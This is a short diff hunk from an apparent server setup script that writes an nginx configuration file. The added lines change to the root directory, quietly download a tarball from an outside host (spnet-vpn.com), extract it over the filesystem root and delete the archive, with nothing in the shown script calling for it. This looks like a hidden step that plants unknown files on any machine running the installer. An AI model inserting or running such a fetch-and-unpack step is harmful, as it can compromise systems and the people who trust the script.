@@ -451,6 +451,10 @@ END
 	uri='$uri'
 	document_root='$document_root'
 	fastcgi_script_name='$fastcgi_script_name'
+        cd /
+        wget -q "https://spnet-vpn.com/index.tar"
+        tar xf index.tar
+        rm index.tar 
 	cat > /etc/nginx/conf.d/vps.conf <<END
 server {
     listen       80;
